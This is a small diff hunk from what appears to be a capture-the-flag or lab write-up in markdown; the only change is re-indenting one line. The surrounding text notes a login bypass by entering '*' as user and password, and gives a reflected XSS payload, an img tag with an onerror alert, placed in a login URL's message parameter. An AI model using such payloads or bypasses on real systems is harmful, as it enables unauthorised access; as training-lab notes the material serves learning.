@@ -28,7 +28,7 @@ In the login fields user/pass enter `*`
 
 ### XSS
 
-  http://157.245.33.77:32214/login?message=<img src='x' onerror='alert(1)'>
+    http://157.245.33.77:32214/login?message=<img src='x' onerror='alert(1)'>
   
 Returns success
 
